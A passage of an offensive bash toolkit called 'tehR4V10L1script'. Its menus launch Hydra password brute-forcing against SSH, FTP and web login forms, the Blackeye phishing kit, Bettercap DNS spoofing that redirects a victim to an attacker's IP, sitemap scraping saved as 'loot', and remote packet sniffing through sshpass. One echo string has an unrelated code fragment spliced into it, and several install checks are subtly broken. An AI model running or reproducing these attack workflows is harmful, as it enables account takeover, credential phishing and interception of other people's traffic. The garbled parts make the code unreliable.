            hydra ${ssh_ip} ssh -l ${ssh_user} -P ${ssh_wordlist} -vV
            echo
            echo
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            bruteforce_menu

        else
            echo -e "${white_color}Monitor mode enabled, I can't scan right!"
            echo -e "You can select 'man) Managed' to disable monitor mode.${normal_color}"
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            main_menu
        fi
        bruteforce_menu
    fi

}
# 003.2
function ftp_hydra_bruteforce () {

    clear
    CHECKINSTALL_HYDRA=$(which hydra)
    if [[ CHECKINSTALL_HYDRA = "" ]]
    then
        echo -e "${red_color_slim}  [${white_color} Hydra ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else
        echo
        CHECKMON=$(ifconfig | grep "mon")
        if [[ "$CHECKMON" = "" ]]
        then

            echo -ne "${red_color_slim} [ ${white_color}IP you want to bruteforce${red_color_slim} ]${normal_color}"
                        echo -ne  " > ftp://" ;tput sgr0
            read ftp_ip
            echo
            echo -ne "${red_color_slim} [ ${white_color}Username you want to bruteforce${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
            read ftp_user
            echo
            echo -ne "${red_color_slim} [ ${white_color}Wordlist complete path (with the .txt extension)${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
            read ftp_wordlist
            echo
            clear
            echo
            hydra -l ${ftp_user} -P ${ftp_wordlist} ftp://${ftp_ip}
            echo
            echo
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            bruteforce_menu
        else
            echo -e "${white_color}Monitor mode enabled, I can't scan right!"
            echo -e "You can select 'man) Managed' to disable monitor mode.${normal_color}"
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            main_menu
        fi
        bruteforce_menu
    fi

}
# 003.3
function func_https_hydra_bruteforce () {

	clear
    echo -e "${red_color_slim}                   [${white_color} HTTP / HTTPS HYDRA BRUTEFORCE (POST) ${red_color_slim}]"
    echo
    echo

    CHECKINSTALL_HYDRA=$(which hydra)
    if [[ CHECKINSTALL_HYDRA = "" ]]
    then
        echo -e "${red_color_slim}  [${white_color} Hydra ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    fi

	echo -e "${red_color_slim}  [${white_color} DOES YOUR SITE HAVE HTTPS ENABLED? (TLS/SSL) ${red_color_slim}] ${normal_color}"
	echo -ne "${white_color}  [ Y / N ]"
				echo -ne  " > ${normal_color}" ;tput sgr0
	read Y_N_hydra_https
	echo

	if [[ $Y_N_hydra_https == "y" || $Y_N_hydra_https == "Y"  ]]
	then
		hydra_https_enabled=True
		hydra_https_param="https-post-form"
	elif [[ $Y_N_hydra_https == "n" || $Y_N_hydra_https == "N"  ]]
	then
		hydra_https_enabled=False
		hydra_https_param="http-post-form"
	else
		echo
		echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
		sleep 1
		func_https_hydra_bruteforce
	fi

	echo -e "${red_color_slim}  [${white_color} DOES YOUR SITE NEED COOKIES? ${red_color_slim}] ${normal_color}"
	echo -ne "${white_color}  [ Y / N ]"
				echo -ne  " > ${normal_color}" ;tput sgr0
	read Y_N_hydra_https
	echo

	if [[ $Y_N_hydra_https == "y" || $Y_N_hydra_https == "Y"  ]]
	then
		hydra_cookies_enabled=True
	else
		hydra_cookies_enabled=False
	fi

	echo -ne "${red_color_slim}  [${white_color} COMPLETE LOGIN URL ${red_color_slim}] ${normal_color}"
				echo -ne  " > ${normal_color}http://www." ;tput sgr0
	read hydra_url

	WWW_CHECK="$(echo -e "${hydra_url}" | grep www)"
	HTTP_CHECK="$(echo -e "${hydra_url}" | grep http)"
	if [[ $WWW_CHECK != "" && $HTTP_CHECK != "" ]]
	then
	    hydra_url="$(echo -e "${hydra_url//http:\/\/www./}")"
	elif [[ $WWW_CHECK != "" && $HTTP_CHECK == "" ]]
	then
	    hydra_url="$(echo -e "${hydra_url//www./}")"
	elif [[ $WWW_CHECK == "" && $HTTP_CHECK != "" ]]
	then
	    hydra_url="$(echo -e "${hydra_url//www./}")"
	fi

	hydra_just_url="$(echo -e "${hydra_url}" | cut -d/ -f 1 )"
	hydra_login_page="$(echo -e "${hydra_url//$(echo -e "${hydra_url}" | cut -d/ -f 1 )/}")"

	echo -ne "${red_color_slim}  [${white_color} USER / USERS (.txt) ${red_color_slim}] ${normal_color}"
				echo -ne  " > ${normal_color}" ;tput sgr0
	read hydra_user

	hydra_user_wordlist_check="$(echo -e ${hydra_user} | grep / )"
	if [[ $hydra_user_wordlist_check == "" ]]
	then
		hydra_user_wordlist_enabled=False
		hydra_user_wordlist_param="-l"
	else
		hydra_user_wordlist_enabled=True
		hydra_user_wordlist_param="-L"
	fi

	echo -ne "${red_color_slim}  [${white_color} WEB USER VARIABLE ${red_color_slim}] ${normal_color}"
				echo -ne  " > ${normal_color}" ;tput sgr0
	read hydra_user_var

	echo -ne "${red_color_slim}  [${white_color} PASSWORD WORDLIST ${red_color_slim}] ${normal_color}"
				echo -ne  " > ${normal_color}" ;tput sgr0
	read hydra_pass_wordlist

	echo -ne "${red_color_slim}  [${white_color} WEB PASS VARIABLE ${red_color_slim}] ${normal_color}"
				echo -ne  " > ${normal_color}" ;tput sgr0
	read hydra_pass_var

	echo -ne "${red_color_slim}  [${white_color} WEB ERROR MSG ${red_color_slim}] ${normal_color}"
				echo -ne  " > ${normal_color}" ;tput sgr0
	read hydra_error_msg

	if [[ $hydra_cookies_enabled == True ]]
	then
		echo -ne "${red_color_slim}  [${white_color} COOKIE ${red_color_slim}] ${normal_color}"
					echo -ne  " > ${normal_color}" ;tput sgr0
		read hydra_cookie
	fi

	mkdir -p /root/tehR4V10L1script/loot/hydra 2>/dev/null
	cd /root/tehR4V10L1script/loot/hydra
	if [[ $hydra_cookies_enabled == True ]]
	then
		xterm -geometry 142x34 -fa "Monospace" -fs "10" -T "[ tehR4V10L1script ]-[ Hydra ]" -e "hydra $hydra_user_wordlist_param $hydra_user -P $hydra_pass_wordlist -t 10 -w 30 -o \"/root/tehR4V10L1script/loot/hydra/$hydra_just_url.txt\" $hydra_just_url $hydra_https_param \"$hydra_login_page:$hydra_user_var=^USER^&$hydra_pass_var=^PASS^:F=$hydra_error_msg:H=$hydra_cookie\" && echo ; echo -ne \"${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}\" ; read -p "" "
	elif [[ $hydra_cookies_enabled == False ]]
	then
		xterm -geometry 130x28 -fa "Monospace" -fs "10" -T "[ tehR4V10L1script ]-[ Hydra ]" -e "hydra $hydra_user_wordlist_param $hydra_user -P $hydra_pass_wordlist -t 10 -w 30 -o \"/root/tehR4V10L1script/loot/hydra/$hydra_just_url.txt\" $hydra_just_url $hydra_https_param \"$hydra_login_page:$hydra_user_var=^USER^&$hydra_pass_var=^PASS^:F=$hydra_error_msg\" ; echo ; echo -ne \"${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}\" ; read -p \"\" "
	fi

	cd $ACTUAL_FOLDER
	bruteforce_menu


}


#############################
# 004
function spoof_menu () {

    clear
    echo
    echo -e "${red_color_slim} [${white_color} Phishing / spoofing menu ${red_color_slim}]${normal_color}"
    echo
    echo -e "${white_color} 01) ${normal_color}Spoof logins and social media with blackeye (https://github.com/thelinuxchoice/blackeye)${normal_color}"
    echo -e "${white_color} 02) ${normal_color}Spoof dns with bettercap${normal_color}"
    echo -e "${white_color} 00)${normal_color} Back${normal_color}"
    echo
    echo -e "${white_color} [Option]"
                echo -ne  "   > " ;tput sgr0
    read spoof_option

    if [[ $spoof_option = 0 ||  $spoof_option = 00 ]]
    then
        main_menu
    elif [[ $spoof_option = 1 || $spoof_option = 01 ]]
    then
        exec_blackeye
    elif [[ $spoof_option = 2 || $spoof_option = 02 ]]
    then
        bettercap_dns_spoof
    else
        echo
        echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
        sleep 1
        spoof_menu
    fi

}
# 004.1
function exec_blackeye () {

    clear
    CHECKINSTALL_BLACKEYE=$(ls /root/tehR4V10L1script/installs/blackeye 2>/dev/null)
    if [[ $CHECKINSTALL_BLACKEYE = "" ]]
    then
        echo -e "${red_color_slim}  [${white_color} Blackeye ${red_color_slim}] ${white_color} is not installed in ${red_color}~/root/tehR4V10L1script/installs${white_color} ! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else
        clear
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to launch blackeye.${normal_color}"
        read -p ""
        clear
        echo
        cd /root/tehR4V10L1script/installs/blackeye && bash blackeye.sh
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    fi

}
# 004.2
function bettercap_dns_spoof () {

    clear
    echo -e "${red_color_slim}                   [${white_color} BETTERCAP DNS SPOOF ${red_color_slim}]"
    echo
    echo
    CHECKINSTALL_BETTERCAP=$(which bettercap)
    if [[ CHECKINSTALL_BETTERCAP = "" ]]
    then
        echo -e "${red_color_slim}  [${white_color} Bettercap ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else
        echo
        echo
        echo -ne "${red_color_slim} [ ${white_color}INTERFACE NAME${red_color_slim} ]${normal_color}"
                        echo -ne  " > " ;tput sgr0
        read interface_name_managed
        CHECKMON=$(ifconfig | grep "mon")
        if [[ "$CHECKMON" = "" ]]
        then
            echo
            echo -e "${red_color_slim} [ ${white_color}IP YOU WANT YOUR TARGET TO BE REDIRECTED ( ex. 192.168.1.XX / malicious IP )${red_color_slim} ]${white_color}"
                            echo -ne  "     > ${normal_color}" ;tput sgr0
            read redirect_target2me
            echo
            echo -e "${red_color_slim} [ ${white_color}IP OR SITE YOU WANT YOUR TARGET TO BE REDIRECTED ( the site your target wants to visit )${red_color_slim} ]${white_color}"
                            echo -ne  "     > ${normal_color}" ;tput sgr0
            read imgoing2beredirected

            hosts_file=$(echo -e ${redirect_target2me}                ${imgoing2beredirected})
            mkdir -p /root/tehR4V10L1script/tempfiles/bettercap 2>/dev/null
            cd /root/tehR4V10L1script/tempfiles/bettercap
            touch hosts.conf
            echo ${hosts_file} >> hosts.conf
            echo -e "${red_color_slim} [ ${white_color}Now I wilelif [[ $option = 6 || $option  = 006 ]]; then
        raspi_menul show you the hosts.conf file so you can edit it if you want${red_color_slim} ]${white_color}"
            xterm -geometry 142x34 -fa "Monospace" -fs "10" -T "[ tehR4V10L1script ]-[ edit hosts.conf ]" -e "clear; sleep 0.1; echo -e \" ${green_color} [+] ${white_color}loading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}Loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}lOading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loAding  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loaDing  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadIng  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadiNg  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadinG  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}Loading  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}lOading  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loAding  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loaDing  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadIng  \ \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadiNg  - \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loadinG  / \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  | \"; sleep 0.1; clear; echo -e \" ${green_color} [+] ${white_color}loading  \ \"; sleep 0.1; clear; nano hosts.conf" 2>/dev/null
            echo
            echo -ne "${red_color_slim} [ ${white_color}TARGET's LOCAL IP (192.168.1.XXX)${red_color_slim} ]${normal_color}"
                            echo -ne  " > " ;tput sgr0
            read victims_ip
            echo
            echo -ne "${red_color_slim} [ ${white_color}GATEWAY (192.168.X.1)${red_color_slim} ]${normal_color}"
                            echo -ne  " > " ;tput sgr0
            read host_gateway
            xterm -geometry 142x34  -fa "Monospace" -fs "8" -T "[ tehR4V10L1script ]-[ bettercap ]" -e bettercap -I ${interface_name_managed} -G ${host_gateway} -T ${victims_ip} --dns /root/tehR4V10L1script/tempfiles/bettercap/hosts.conf 2>/dev/null

            rm -r /root/tehR4V10L1script/tempfiles/bettercap/*

        else
            echo -e "${white_color}Monitor mode enabled, I can't spoof anything!"
            echo -e "You can select 'man) Managed' to disable monitor mode.${normal_color}"
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            main_menu
        fi
        spoof_menu
    fi

}
#############################
# 005
function web_attack_menu () {

	clear
    echo
    echo -e "${red_color_slim} [${white_color} Web attack menu ${red_color_slim}]${normal_color}"
    echo
    echo -e "${white_color} 01) ${normal_color}Find, filter and capture /${green_color}stiemap.xml${normal_color}s from a web"
    # echo -e "${white_color} 02) ${normal_color} TEXT AAAAAAAAAAAA{normal_color}"
    echo -e "${white_color} 00)${normal_color} Back${normal_color}"
    echo
    echo -e "${white_color} [Option]"
                echo -ne  "   > " ;tput sgr0
    read web_attack_option

    if [[ $web_attack_option = 0 ||  $web_attack_option = 00 ]]
    then
        main_menu
    elif [[ $web_attack_option = 1 || $web_attack_option = 01 ]]
    then
        sitemap_filter
    # elif [[ $web_attack_option = 2 || $web_attack_option = 02 ]]
    # then
    #     raspi_tcp_sniff
    else
        echo
        echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
        sleep 1
        web_attack_menu
    fi

}
# 005.1
function sitemap_filter () {

	clear
	echo
	echo -e "${red_color_slim}                   [${white_color} SITEMAP FINDER & FILTER ${red_color_slim}]"
	echo
	echo
	echo -ne "${red_color_slim} [${white_color} Target's url ${red_color_slim}] > ${normal_color}http://www.${white_color}"
	read TARGET_URL

	WWW_CHECK="$(echo -e "${TARGET_URL}" | grep www)"
	HTTP_CHECK="$(echo -e "${TARGET_URL}" | grep http)"
	if [[ $WWW_CHECK == "" && $HTTP_CHECK == "" ]]
	then
	    TARGET_URL="http://www.${TARGET_URL}"
		TARGET_URL_HTTPS="https://www.${TARGET_URL}"
	elif [[ $WWW_CHECK != "" && $HTTP_CHECK == "" ]]
	then
	    TARGET_URL="http://${TARGET_URL}"
		TARGET_URL_HTTPS="https://${TARGET_URL}"
	elif [[ $WWW_CHECK == "" && $HTTP_CHECK != "" ]]
	then
	    TARGET_URL="$(echo -e "${TARGET_URL//http:\/\//http:\/\/www.}")"
		TARGET_URL_HTTPS="$(echo -e "${TARGET_URL//http:\/\//https:\/\/www.}")"
	fi

	PING_RES="$(curl -Is ${TARGET_URL} | head -1 | grep 200 )"
	PING_RES_HTTPS="$(curl -Is ${TARGET_URL} | head -1 | grep 200 )"
	if [[ $PING_RES == "" ]]
	then

	    echo -e "${white_color} The url${red_color_slim} [${red_color}${TARGET_URL}${red_color_slim}] does not exist or is not recheable."
	    echo -ne "${white_color} Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
	    read -p ""
	    echo
	    web_attack_menu
	fi

	echo -e "${white_color} The web exists!! Checking sitemap...."

	PING_SITEMAP_RES="$(curl -Is ${TARGET_URL}/sitemap.xml | head -1 | grep 200 )"
	if [[ $PING_SITEMAP_RES == "" ]]
	then
	    echo -e "${white_color} The url${red_color_slim} [${red_color}${TARGET_URL}${red_color_slim}] exist but curl can't see the <sitemap.xml>. Trying with wget..."
		mkdir -p /root/tehR4V10L1script/loot/sitemaps 2>/dev/null
		cd /root/tehR4V10L1script/loot/sitemaps
	    rm sitemap.xml 2>/dev/null
	    wget ${TARGET_URL}/sitemap.xml > /dev/null 2>&1
	    CAT_SITEMAP_WGET="$(cat sitemap.xml 2>/dev/null)"
	    if [[ $CAT_SITEMAP_WGET == "" ]]
	    then
	        echo -e "${white_color} The url${red_color_slim} [${red_color}${TARGET_URL}${red_color_slim}] exist but curl and wget couldn't see the <sitemap.xml>."
	        echo -ne "${white_color} Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
	        read -p ""
	        echo
	        web_attack_menu
	    else
	        CAT_THE_FILE="y"
	    fi
	else
	    CAT_THE_FILE="n"
	fi

	echo -e "${white_color} All correct!! Showing the urls...."
	sleep 0.2
	mkdir -p /root/tehR4V10L1script/loot/sitemaps 2>/dev/null
	cd /root/tehR4V10L1script/loot/sitemaps
	echo -e "${green_color}[=====================================================================]${normal_color}"
	if [[ $CAT_THE_FILE = "y" ]]
	then
	    cat sitemap.xml | grep http | cut -d \> -f 2 | cut -d \< -f 1 | grep http
		touch /root/tehR4V10L1script/loot/sitemaps/sitemap_loot.txt
		echo "" >> /root/tehR4V10L1script/loot/sitemaps/sitemap_loot.txt
		echo "" >> /root/tehR4V10L1script/loot/sitemaps/sitemap_loot.txt
		echo -e "[=========================${TARGET_URL}=========================]" >> /root/tehR4V10L1script/loot/sitemaps/sitemap_loot.txt
	    echo -e "$(cat sitemap.xml | grep http | cut -d \> -f 2 | cut -d \< -f 1 | grep http)" >> /root/tehR4V10L1script/loot/sitemaps/sitemap_loot.txt
	elif [[ $CAT_THE_FILE = "n" ]]
	then
	    curl -s ${TARGET_URL}/sitemap.xml | grep http | cut -d \> -f 2 | cut -d \< -f 1 | grep http
		touch /root/tehR4V10L1script/loot/sitemaps/sitemap_loot.txt
		touch /root/tehR4V10L1script/loot/sitemaps/sitemap_loot.txt
		echo "" >> /root/tehR4V10L1script/loot/sitemaps/sitemap_loot.txt
		echo "" >> /root/tehR4V10L1script/loot/sitemaps/sitemap_loot.txt
		echo -e "[=========================${TARGET_URL}=========================]" >> /root/tehR4V10L1script/loot/sitemaps/sitemap_loot.txt
	    echo -e "$(curl -s ${TARGET_URL}/sitemap.xml | grep http | cut -d \> -f 2 | cut -d \< -f 1 | grep http)" >> /root/tehR4V10L1script/loot/sitemaps/sitemap_loot.txt
	fi
	echo -e "${green_color}[=====================================================================]${normal_color}"
	echo
	echo -e "${white_color} ..."
	echo -e "${white_color} Resoluts saved in ${red_color}[${red_color_slim} /root/tehR4V10L1script/loot/sitemaps/sitemap_loot.txt ${red_color}]${white_color}. ${normal_color}"
	echo
	cd ${ACTUAL_FOLDER}
	echo -ne "${white_color} Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
	read -p ""
	web_attack_menu

}
#############################
# 006
function rkhunter_scan () {

    clear
    CHECKINSTALL_RKHUNTER=$(which rkhunter)
    if [[ CHECKINSTALL_RKHUNTER = "" ]]
    then
        echo -e "${red_color_slim}  [${white_color} Rkhunter ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    else
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to scan your PC with rkhunter.${normal_color}"
        read -p ""
        clear
        echo
		rkhunter -c
        echo
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    fi

}

#############################
# 007
function raspi_menu () {

    clear
    echo
    echo -e "${red_color_slim} [${white_color} Raspberry pi menu ${red_color_slim}]${normal_color}"
    echo
    echo -e "${white_color} 01) ${normal_color}SSH into a Raspberry Pi${normal_color}"
    echo -e "${white_color}[${normal_color}══════════${white_color}EXECUTE${normal_color}═${white_color}IN${normal_color}═${white_color}THE${normal_color}═${white_color}RASPBERRY${normal_color}═${white_color}PI${normal_color}══════════${white_color}]${normal_color}"
    echo -e "${white_color} 02) ${normal_color}Sniff network trafic with tcpdump${normal_color}"
    echo -e "${white_color} 00)${normal_color} Back${normal_color}"
    echo
    echo -e "${white_color} [Option]"
                echo -ne  "   > " ;tput sgr0
    read raspi_option

    if [[ $raspi_option = 0 ||  $raspi_option = 00 ]]
    then
        main_menu
    elif [[ $raspi_option = 1 || $raspi_option = 01 ]]
    then
        ssh_raspi
    elif [[ $raspi_option = 2 || $raspi_option = 02 ]]
    then
        raspi_tcp_sniff
    else
        echo
        echo -e "${red_color}    \(╰◣▂ ◢╯)Ψ   ${white_color}Wrong option!"
        sleep 1
        raspi_menu
    fi

}
# 007.1
function ssh_raspi () {

    CHECKMON=$(ifconfig | grep "mon")
    if [[ "$CHECKMON" = "" ]]
    then
        clear
        echo
        echo -ne "${red_color_slim} [ ${white_color}IP you want to SSH${red_color_slim} ]${normal_color}"
                    echo -ne  " > " ;tput sgr0
        read ssh_ip
        echo -ne "${red_color_slim} [ ${white_color}SSH user${red_color_slim} ]${normal_color}"
                    echo -ne  " > " ;tput sgr0
        read ssh_user
        echo -ne "${red_color_slim} [ ${white_color}SSH port${red_color_slim} ]${normal_color}"
                    echo -ne  " > " ;tput sgr0
        read ssh_port
        xterm  -fa "Monospace" -fs "8"  -geometry 140x34 -T "[ tehR4V10L1script ]-[ SSH ]" -e ssh ${ssh_ip} -l ${ssh_user} -p ${ssh_port} 2>/dev/null

        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        raspi_menu
    else
        echo -e "${white_color}Monitor mode enabled, I can't SSH!"
		echo -e "You can select 'man) Managed' to disable monitor mode.${normal_color}"
		echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    fi

}
# 007.2
function raspi_tcp_sniff () {

    CHECKMON=$(ifconfig | grep "mon")
    if [[ "$CHECKMON" = "" ]]
    then
        clear
        echo
        echo -ne "${red_color_slim} [ ${white_color}IP of the rasberry pi${red_color_slim} ]${normal_color}"
                    echo -ne  " > " ;tput sgr0
        read ssh_ip
        echo
        echo -ne "${red_color_slim} [ ${white_color}SSH user${red_color_slim} ]${normal_color}"
                    echo -ne  " > " ;tput sgr0
        read ssh_user
        echo
        echo -ne "${red_color_slim} [ ${white_color}Seconds you want to sniff${red_color_slim} ]${normal_color}"
                    echo -ne  " > " ;tput sgr0
        read sniff_seconds
        echo
        echo -ne "${red_color_slim} [ ${white_color}SSH password${red_color_slim} ]${normal_color}"
                    echo -ne  " > " ;tput sgr0
        read -s ssh_pass
        echo
        echo
        echo -e "${white_color}  All done! ${normal_color}"
        echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to start sniffing.${normal_color}"
        read -p ""

        clear
        CHECKINSTALL_SSHPASS=$(which sshpass)
        if [[ CHECKINSTALL_SSHPASS = "" ]]
        then
            echo -e "${red_color_slim}  [${white_color} Sshpass ${red_color_slim}] ${white_color} is not installed! You can install it in the \"ins)\" menu."
            echo
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            main_menu
        else
            clear
            echo
            echo -e "${white_color}  Please wait... ${normal_color}"
            sshpass -p ${ssh_pass} ssh ${ssh_user}@${ssh_ip} sudo apt-get install -y tcpdump 1>/dev/null
            echo
            echo -e "${white_color}  Tcpdump installed in the raspberry pi! ${normal_color}"
            sshpass -p ${ssh_pass} ssh ${ssh_user}@${ssh_ip} sudo rm -r /home/${ssh_user}/tehR4V10L1script/temporal 2>/dev/null
            sshpass -p ${ssh_pass} ssh ${ssh_user}@${ssh_ip} sudo mkdir /home/${ssh_user}/tehR4V10L1script/ 2>/dev/null
            sshpass -p ${ssh_pass} ssh ${ssh_user}@${ssh_ip} sudo mkdir /home/${ssh_user}/tehR4V10L1script/temporal/ 2>/dev/null
            sshpass -p ${ssh_pass} ssh ${ssh_user}@${ssh_ip} sudo mkdir /home/${ssh_user}/tehR4V10L1script/temporal/sniffing/ 2>/dev/null
            echo
            echo -e "${white_color}  Directories made in the raspberry pi! ${normal_color}"
            echo -e "${white_color}  The raspberry pi is scanning now. This may take a while... ${normal_color}"
            sshpass -p ${ssh_pass} ssh ${ssh_user}@${ssh_ip} sudo timeout ${sniff_seconds} tcpdump -w /home/${ssh_user}/tehR4V10L1script/temporal/sniffing/dump.pcap > /dev/null 2>&1
            sshpass -p ${ssh_pass} ssh ${ssh_user}@${ssh_ip} sudo chown ${ssh_user} /home/${ssh_user}/tehR4V10L1script/temporal/sniffing/dump.pcap > /dev/null 2>&1
            echo
            echo -e "${white_color}  Pcap file made in the raspberry pi! ${normal_color}"
            sleep 0.5

            rm -r /root/tehR4V10L1script/sniffing/ > /dev/null 2>&1
            mkdir /root/tehR4V10L1script/ 2>/dev/null
            mkdir /root/tehR4V10L1script/sniffing/ 2>/dev/null
            echo
            echo -e "${white_color}  Directories made in the local machine! ${normal_color}"

            sshpass -p ${ssh_pass} scp ${ssh_user}@${ssh_ip}:/home/${ssh_user}/tehR4V10L1script/temporal/sniffing/dump.pcap /root/tehR4V10L1script/sniffing/ > /dev/null 2>&1
            echo
            echo -e "${white_color}  All done! ${normal_color}"
            echo -e "${white_color}  The file is saved in ${red_color_slim} ~/tehR4V10L1script/sniffing/dump.pcap${normal_color}"
            echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
            read -p ""
            raspi_menu
        fi
    else
        echo -e "${white_color}Monitor mode enabled, I can't SSH!"
		echo -e "You can select 'man) Managed' to disable monitor mode.${normal_color}"
		echo -ne "${white_color}  Press ${red_color_slim}[ENTER]${white_color} to continue.${normal_color}"
        read -p ""
        main_menu
    fi

}


########################################################################################################################################################

#//###############################
#           TAB FEATURE          #
#//###############################
#      STARTING THE PROGRAM      #
#//###############################

# function read_quick_access () {
#
# 	case $2 in
# 	     ubuntu)
# 	          echo "I know it! It is an operating system based on Debian."
# 	          ;;
# 	     centos|rhel)
# 	          echo "Hey! It is my favorite Server OS!"
# 	          ;;
# 	     windows)
# 	          echo "Very funny..."
# 	          ;;
# 	     *)
# 	          echo "Hmm, seems i've never used it."
# 	          ;;
# 	  esac
#
# }

######################


if [[ "$1" == "" || "$1" == " " || "$1" == "  " || "$1" == "-" || "$1" == "--" ]]
then
	banner_animation
    clear
    exit 0
elif [[ "$1" == "-h" || "$1" == "--h" || "$1" == "-help" || "$1" == "--help" || "$1" == "-H" || "$1" == "--H" || "$1" == "-HELP" || "$1" == "--HELP" ]]
then

	clear
	echo -e "${white_color} [═══════════════════════════════════════════════════════════════════════════════]"
    echo -e "${red_color_slim}                             [${white_color} TEHR4V10L1SCRIPT HELP ${red_color_slim}]"
    echo
    echo -e "${white_color}  Available options:"
    echo -e "${white_color}    -h   --help ${normal_color}                     Show help menu."
	echo -e "${white_color}    -    --     ${normal_color}                     Launch the program as usual."
    echo -e "${white_color}    -qa  --quick-access  <number>  ${normal_color}  Access an specific menu option. (See --tree)"
    echo -e "${white_color}    -t   --tree ${normal_color}                     See a tree of the quick acces numbers"
	echo -e " [═══════════════════════════════════════════════════════════════════════════════]"

    echo

elif [[ "$1" == "-tree" || "$1" == "--tree" || "$1" == "-t" || "$1" == "--t" || "$1" == "-TREE" || "$1" == "--TREE" || "$1" == "-T" || "$1" == "--T"  ]]
then
	clear
	echo -e "${white_color} [═══════════════════════════════════════════════════════════════════════════════]"
	echo "  [TEHR4V10L1SCRIPT]-[ TREE ]"
	echo "                    ├── 001 - Global WiFi menu"
    echo "                    │    │" 
	echo "                    │    └── 001.1 - Deauth menu"
	echo "                    │    │    └──001.1.1 - Aireplay deauth"
	echo "                    │    └── 001.2 - WPS menu"
	echo "                    │    │    └── 001.2.1 - Reaver wps pin attack"
	echo "                    │    │    └── 001.2.2 - Bully wps pin attack"
	echo -e "                    │    └── ${red_color}001.3 - Handshake capture menu ${normal_color}"
	echo "                    │    └── 001.4 - Handshake offline menu"
	echo "                    │    │    └── 001.4.1 - Offline aircrack handshake"
	echo "                    │    └── 001.5 - Sniffing menu"
	echo "                    │    │    └── 001.5.1 - Local tcpdump sniff"
	echo "                    │    │    └── 001.5.2 - Local kismet sniff"
	echo -e "                    │    │    └── ${red_color}001.5.3 - View .pcap with wireshark ${normal_color}"
	echo -e "                    │    └── ${green_color}001.6 - Execute routersploit ${normal_color}"
	echo "                    │ "
	echo "                    └── 002 - Nmap scanning menu"
	echo -e "                    │    └── ${green_color}002.1 - Scan all network devices with nmap${normal_color}"
	echo -e "                    │    └── ${green_color}002.2 - Single IP nmap scan (regular scan)${normal_color}"
